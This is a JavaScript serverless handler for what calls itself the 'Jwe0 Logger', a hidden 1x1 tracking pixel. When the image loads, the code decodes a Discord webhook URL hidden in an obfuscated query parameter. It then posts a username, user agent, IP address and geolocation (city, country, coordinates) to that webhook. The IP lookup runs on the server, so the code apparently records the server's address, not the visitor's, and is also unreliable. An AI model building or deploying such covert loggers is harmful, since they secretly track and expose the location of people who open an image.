const express = require('express');
const path = require('path');
const serverless = require('serverless-http');
const app = express();

function getParams(req) {
    return req.query;
}

function send_data(data) {
    fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(ip_data => {
        const ip = ip_data.ip;
        fetch('https://ipapi.co/' + ip + '/json/')
        .then(response => response.json())
        .then(ip_lookup_data => {
            const message = {
                embeds: [{
                    title : "Jwe0 Logger",
                    description : "A user has been logged",
                    fields : [
                        {
                            name : "User",
                            value : "```" + data[1] + "```"
                        },
                        {
                            name : "IP",
                            value : "```" + ip + "```"
                        },
                        {
                            name : "UA",
                            value : "```" + data[2] + "```"
                        },
                        {
                            name : "Location",
                            value : "```" + "Ip: " + ip_lookup_data.ip + "\n" +"City: " + ip_lookup_data.city + "\n" +"Country: " + ip_lookup_data.country + "\n" + ip_lookup_data.timezone + "\n" +"Latitude: " + ip_lookup_data.latitude + "\n" +"Longitude: " + ip_lookup_data.longitude + "\n" + "```"
                        }
                    ]
                }]
            };
            fetch(data[0], {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
        });
    });
}

function getvalues(params) {
    const username = params.username;
    const secret  = params.secret;
    const secret_values = secret.split(username);

    const secretids = secret_values[0];
    const secretint = secret_values[1].split("|");

    const token = secretids.slice(0, secretint[0]);
    const id = secretids.slice(secretint[0]);

    const url = "https://discord.com/api/webhooks/" + id + "/" + token;

    return [url, username, params.userAgent];
}

function run(req) {
    const url_paramaters = getParams(req);
    const values = getvalues(url_paramaters);
    console.log(url_paramaters, values);
    send_data(values);
}

app.get('/image', (req, res) => {
    run(req);
    res.sendFile(path.resolve('public', '1x1.png'));
});

module.exports.handler = serverless(app);
